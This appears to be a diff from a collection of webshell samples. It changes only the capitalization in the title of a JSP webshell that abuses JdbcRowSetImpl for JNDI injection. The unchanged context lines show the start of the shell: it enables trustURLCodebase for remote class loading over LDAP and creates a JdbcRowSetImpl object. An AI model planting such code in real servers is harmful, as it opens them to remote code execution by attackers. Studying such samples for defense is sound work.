@@ -1,7 +1,7 @@
 <%@ page import="com.sun.rowset.JdbcRowSetImpl" %>
 <html>
 <body>
-<h2>JdbcRowSetImpl进行jndi注入的JSP Webshell</h2>
+<h2>JdbcRowSetImpl进行jndi注入的JSP WebShell</h2>
 <%
     System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
     JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
